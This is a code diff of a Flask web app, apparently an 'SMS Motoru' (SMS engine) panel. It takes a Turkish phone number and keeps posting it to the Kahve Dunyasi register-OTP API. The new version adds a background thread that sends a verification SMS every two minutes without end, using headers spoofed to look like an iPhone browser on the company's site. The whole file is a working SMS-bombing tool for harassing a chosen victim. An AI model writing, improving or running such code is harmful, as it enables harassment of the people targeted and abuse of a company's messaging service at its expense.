@@ -1,150 +1,145 @@
 from flask import Flask, render_template_string, request, redirect, url_for
 import requests
+import threading
 import time
 import os
 
 app = Flask(__name__)
 
 target_phone = ""
-logs = []
 sms_count = 0
+last_status = ""
+_started = False
+_lock = threading.Lock()
 
-def send_kahve_dunyasi_otp():
-    global target_phone, logs, sms_count
+def send_sms():
+    global sms_count, last_status
     if not target_phone:
         return
-
-    url = "https://www.kahvedunyasi.com/api/v1/auth/register-otp"
-    payload = {"mobile_number": target_phone, "country_code": "90"}
-    headers = {
-        "Content-Type": "application/json",
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "tr-TR,tr;q=0.9",
-        "Origin": "https://www.kahvedunyasi.com",
-        "Referer": "https://www.kahvedunyasi.com/",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
-    }
-
     try:
-        response = requests.post(url, json=payload, headers=headers, timeout=15)
+        r = requests.post(
+            "https://www.kahvedunyasi.com/api/v1/auth/register-otp",
+            json={"mobile_number": target_phone, "country_code": "90"},
+            headers={
+                "Content-Type": "application/json",
+                "Accept": "application/json, text/plain, */*",
+                "Accept-Language": "tr-TR,tr;q=0.9",
+                "Origin": "https://www.kahvedunyasi.com",
+                "Referer": "https://www.kahvedunyasi.com/",
+                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
+            },
+            timeout=15
+        )
         sms_count += 1
-        if response.status_code in [200, 201]:
-            status = f"[{sms_count}] Gonderildi -> Basarili (HTTP {response.status_code})"
-        else:
-            status = f"[{sms_count}] Gonderildi -> Basarisiz (HTTP {response.status_code})"
-        logs.append(f"[{time.strftime('%H:%M:%S')}] {status}")
-    except requests.exceptions.ConnectionError:
-        logs.append(f"[{time.strftime('%H:%M:%S')}] Baglanti Hatasi")
-    except requests.exceptions.Timeout:
-        logs.append(f"[{time.strftime('%H:%M:%S')}] Zaman Asimi")
+        last_status = f"Son: {time.strftime('%H:%M')} — HTTP {r.status_code}"
     except Exception:
-        logs.append(f"[{time.strftime('%H:%M:%S')}] Bilinmeyen Hata")
+        last_status = f"Hata: {time.strftime('%H:%M')}"
 
-    if len(logs) > 50:
-        logs.pop(0)
+def _loop():
+    while True:
+        time.sleep(120)
+        send_sms()
 
-HTML_TEMPLATE = """
-<!DOCTYPE html>
+@app.before_request
+def boot():
+    global _started
+    with _lock:
+        if not _started:
+            _started = True
+            threading.Thread(target=_loop, daemon=True).start()
+
+PAGE = """<!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMS Panel</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 40px 20px; }
-        .container { width: 100%; max-width: 480px; }
-        .header { text-align: center; margin-bottom: 25px; }
-        .header h1 { font-size: 22px; font-weight: 700; color: #58a6ff; letter-spacing: 1px; }
-        .header p { font-size: 13px; color: #8b949e; margin-top: 5px; }
-        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 25px; margin-bottom: 15px; }
-        .card-title { font-size: 13px; font-weight: 600; color: #8b949e; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 15px; }
-        .status-badge { display: inline-flex; align-items: center; gap: 8px; padding: 8px 14px; border-radius: 20px; font-size: 13px; font-weight: 600; margin-bottom: 15px; }
-        .status-active { background: #1a4731; color: #3fb950; border: 1px solid #238636; }
-        .status-waiting { background: #2d1f0e; color: #d29922; border: 1px solid #9e6a03; }
-        .dot { width: 8px; height: 8px; border-radius: 50%; }
-        .dot-green { background: #3fb950; animation: pulse 1.5s infinite; }
-        .dot-yellow { background: #d29922; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
-        input[type="text"] { width: 100%; padding: 12px 15px; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; color: #c9d1d9; font-size: 15px; outline: none; transition: border-color 0.2s; margin-bottom: 12px; }
-        input[type="text"]:focus { border-color: #58a6ff; }
-        input[type="text"]::placeholder { color: #484f58; }
-        button { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 15px; font-weight: 600; transition: background 0.2s; }
-        button:hover { background: #2ea043; }
-        .stats { display: flex; gap: 10px; margin-bottom: 15px; }
-        .stat-box { flex: 1; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 12px; text-align: center; }
-        .stat-value { font-size: 22px; font-weight: 700; color: #58a6ff; }
-        .stat-label { font-size: 11px; color: #8b949e; margin-top: 3px; }
-        .log-box { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 15px; font-family: 'Courier New', Courier, monospace; font-size: 12px; line-height: 1.6; height: 220px; overflow-y: auto; color: #3fb950; }
-        .log-box::-webkit-scrollbar { width: 4px; }
-        .log-box::-webkit-scrollbar-track { background: #0d1117; }
-        .log-box::-webkit-scrollbar-thumb { background: #30363d; border-radius: 2px; }
-        .log-entry { margin-bottom: 4px; }
-        .log-entry.error { color: #f85149; }
-        .log-entry.info { color: #58a6ff; }
-        .footer { text-align: center; font-size: 11px; color: #484f58; margin-top: 10px; }
-    </style>
-    <script>setTimeout(() => { if (!document.querySelector('input:focus')) location.reload(); }, 20000);</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>SMS Motoru</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:'Inter',sans-serif;background:#0a0a0f;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .wrap{width:100%;max-width:400px}
+  .brand{text-align:center;margin-bottom:40px}
+  .brand-icon{width:56px;height:56px;background:linear-gradient(135deg,#6366f1,#8b5cf6);border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:24px}
+  .brand h1{font-size:20px;font-weight:600;color:#fff;letter-spacing:-.3px}
+  .brand p{font-size:13px;color:#555;margin-top:4px}
+  .card{background:#111118;border:1px solid #1e1e2e;border-radius:20px;padding:32px}
+  .input-group{position:relative;margin-bottom:16px}
+  .prefix{position:absolute;left:16px;top:50%;transform:translateY(-50%);color:#555;font-size:15px;font-weight:500;pointer-events:none}
+  input[type=tel]{width:100%;padding:15px 16px 15px 48px;background:#0d0d1a;border:1.5px solid #1e1e2e;border-radius:12px;color:#fff;font-size:16px;font-family:'Inter',sans-serif;outline:none;transition:border-color .2s}
+  input[type=tel]:focus{border-color:#6366f1}
+  input[type=tel]::placeholder{color:#333}
+  button{width:100%;padding:15px;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:600;font-family:'Inter',sans-serif;cursor:pointer;transition:opacity .2s}
+  button:hover{opacity:.9}
+  .active-box{text-align:center}
+  .check{width:64px;height:64px;background:linear-gradient(135deg,#10b981,#059669);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:28px}
+  .active-title{font-size:17px;font-weight:600;color:#fff;margin-bottom:6px}
+  .active-phone{font-size:13px;color:#6366f1;font-weight:500;margin-bottom:24px}
+  .stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}
+  .stat{background:#0d0d1a;border:1px solid #1e1e2e;border-radius:12px;padding:14px;text-align:center}
+  .stat-val{font-size:22px;font-weight:700;color:#fff}
+  .stat-lbl{font-size:11px;color:#555;margin-top:3px;text-transform:uppercase;letter-spacing:.5px}
+  .last-status{font-size:12px;color:#555;margin-bottom:20px;min-height:18px}
+  .pulse{display:inline-flex;align-items:center;gap:6px;background:#0d1a12;border:1px solid #065f46;border-radius:20px;padding:6px 14px;font-size:12px;color:#10b981;font-weight:500}
+  .dot{width:7px;height:7px;background:#10b981;border-radius:50%;animation:blink 1.4s infinite}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+  .reset{display:block;margin-top:16px;text-align:center;font-size:12px;color:#333;cursor:pointer;text-decoration:none;transition:color .2s}
+  .reset:hover{color:#6366f1}
+</style>
+{% if phone %}<script>setTimeout(()=>location.reload(),20000)</script>{% endif %}
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>SMS MOTORU</h1>
-            <p>Kahve Dunyasi OTP Sistemi</p>
-        </div>
-        <div class="card">
-            <div class="card-title">Sistem Durumu</div>
-            {% if phone %}
-            <div class="status-badge status-active"><div class="dot dot-green"></div>AKTIF - +90 {{ phone }}</div>
-            {% else %}
-            <div class="status-badge status-waiting"><div class="dot dot-yellow"></div>NUMARA BEKLENIYOR</div>
-            {% endif %}
-            <div class="stats">
-                <div class="stat-box"><div class="stat-value">{{ sms_count }}</div><div class="stat-label">Toplam Gonderim</div></div>
-                <div class="stat-box"><div class="stat-value">2</div><div class="stat-label">Dakika Aralik</div></div>
-                <div class="stat-box"><div class="stat-value">24</div><div class="stat-label">Saat Surekli</div></div>
-            </div>
-        </div>
-        <div class="card">
-            <div class="card-title">Numara Ayarla</div>
-            <form method="POST">
-                <input type="text" name="phone" placeholder="5051234567 (basi olmadan)" value="{{ phone }}">
-                <button type="submit">Kaydet ve Baslat</button>
-            </form>
-        </div>
-        <div class="card">
-            <div class="card-title">Canli Log</div>
-            <div class="log-box" id="logBox">
-                {% for log in logs %}
-                <div class="log-entry {% if 'Hata' in log or 'Asimi' in log %}error{% elif 'guncellendi' in log %}info{% endif %}"> > {{ log }}</div>
-                {% else %}
-                <div style="color: #484f58;">Henuz gonderim yapilmadi. Numara girerek baslatin.</div>
-                {% endfor %}
-            </div>
-        </div>
-        <div class="footer">Her 20 saniyede bir otomatik yenilenir | Render Web Service</div>
+<div class="wrap">
+  <div class="brand">
+    <div class="brand-icon">☕</div>
+    <h1>SMS Motoru</h1>
+    <p>Kahve Dunyasi OTP</p>
+  </div>
+  <div class="card">
+    {% if phone %}
+    <div class="active-box">
+      <div class="check">✓</div>
+      <div class="active-title">SMS Baslatildi</div>
+      <div class="active-phone">+90 {{ phone }}</div>
+      <div class="stats">
+        <div class="stat"><div class="stat-val">{{ count }}</div><div class="stat-lbl">Gonderim</div></div>
+        <div class="stat"><div class="stat-val">2 dk</div><div class="stat-lbl">Aralik</div></div>
+      </div>
+      <div class="last-status">{{ status if status else 'Ilk gonderi 2 dakika sonra...' }}</div>
+      <div class="pulse"><div class="dot"></div> Sistem Aktif</div>
+      <a class="reset" href="/reset">Numarayi Degistir</a>
     </div>
-    <script>const lb = document.getElementById('logBox'); if (lb) lb.scrollTop = lb.scrollHeight;</script>
+    {% else %}
+    <form method="POST" action="/">
+      <div class="input-group">
+        <span class="prefix">+90</span>
+        <input type="tel" name="phone" placeholder="5051234567" maxlength="10" required autofocus>
+      </div>
+      <button type="submit">SMS Gonderimi Baslat</button>
+    </form>
+    {% endif %}
+  </div>
+</div>
 </body>
-</html>
-"""
+</html>"""
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
-    global target_phone, logs, sms_count
+    global target_phone
     if request.method == 'POST':
-        new_phone = request.form.get('phone', '').strip()
-        if new_phone:
-            target_phone = new_phone
-            logs.append(f"[{time.strftime('%H:%M:%S')}] Hedef numara guncellendi: +90{target_phone}")
+        p = request.form.get('phone', '').strip()
+        if p:
+            target_phone = p
         return redirect(url_for('index'))
+    return render_template_string(PAGE, phone=target_phone, count=sms_count, status=last_status)
 
-    return render_template_string(
-        HTML_TEMPLATE,
-        phone=target_phone,
-        logs=reversed(list(logs)),
-        sms_count=sms_count
-    )
+@app.route('/reset')
+def reset():
+    global target_phone, sms_count, last_status
+    target_phone = ""
+    sms_count = 0
+    last_status = ""
+    return redirect(url_for('index'))
 
-if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
